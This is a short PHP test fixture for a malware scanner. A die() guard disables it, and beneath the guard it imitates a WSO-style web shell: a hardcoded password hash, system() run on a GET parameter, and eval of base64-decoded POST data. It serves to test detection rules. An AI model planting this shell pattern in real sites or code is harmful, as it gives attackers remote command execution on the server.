<?php die('LW-SCAN DEMO MALWARE - inert test fixture, does nothing'); ?>
<?php
// Trips: 0002, 0005, 0007, 0009 - a fake WSO-style shell, fully inert.
$auth_pass = "202cb962ac59075b964b07152d234b70"; // md5("123")
echo "WSO FilesMan";
if (isset($_REQUEST['a'])) {
    system($_GET['cmd']);
    eval(base64_decode($_POST['z']));
}
